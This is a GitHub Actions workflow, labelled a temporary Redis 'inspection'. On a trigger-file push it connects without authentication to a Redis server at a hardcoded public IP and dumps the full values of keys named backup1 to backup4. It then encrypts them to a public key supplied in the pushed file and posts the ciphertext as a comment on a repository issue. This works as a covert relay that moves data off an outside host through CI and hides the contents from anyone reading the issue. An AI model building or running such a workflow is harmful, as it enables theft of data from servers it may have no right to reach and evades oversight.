name: Temporary OutClub Redis Sealed Inspection

on:
  push:
    branches: [main]
    paths:
      - '.outclub-redis-sealed-target'

permissions:
  contents: read
  issues: write

jobs:
  inspect:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    env:
      OPS_ISSUE: '3'
      HOST: '46.224.206.150'
    steps:
      - uses: actions/checkout@v4
      - name: Read target and seal fixed Redis values
        env:
          GH_TOKEN: ${{ github.token }}
        shell: bash
        run: |
          set -euo pipefail
          NONCE=$(sed -n 's/^nonce=//p' .outclub-redis-sealed-target)
          PUB=$(sed -n 's/^public_key_hex=//p' .outclub-redis-sealed-target)
          [[ "$NONCE" =~ ^[0-9a-f]{32}$ ]] || exit 64
          [[ "$PUB" =~ ^[0-9a-f]{64}$ ]] || exit 64
          sudo apt-get update -qq
          sudo apt-get install -y -qq redis-tools
          python3 -m pip install --quiet pynacl
          python3 - "$HOST" <<'PY' > /tmp/redis-values.json
          import base64,json,subprocess,sys
          host=sys.argv[1]
          out={}
          for key in ('backup1','backup2','backup3','backup4'):
              p=subprocess.run(['redis-cli','-h',host,'-p','6379','--no-auth-warning','--raw','GET',key],capture_output=True)
              data=p.stdout.rstrip(b'\n') if p.returncode==0 else b''
              out[key]={'length':len(data),'sha256':__import__('hashlib').sha256(data).hexdigest(),'value_b64':base64.b64encode(data).decode()}
          print(json.dumps(out,separators=(',',':')))
          PY
          PUB="$PUB" python3 - <<'PY' > /tmp/redis-cipher.b64
          import os,base64
          from nacl.public import PublicKey,SealedBox
          pk=PublicKey(bytes.fromhex(os.environ['PUB']))
          msg=open('/tmp/redis-values.json','rb').read()
          print(base64.b64encode(SealedBox(pk).encrypt(msg)).decode())
          PY
          CIPHER=$(cat /tmp/redis-cipher.b64)
          gh api "repos/${{ github.repository }}/issues/$OPS_ISSUE/comments" -f body="REDIS_BUNDLE nonce=$NONCE $CIPHER" >/dev/null
          rm -f /tmp/redis-values.json /tmp/redis-cipher.b64
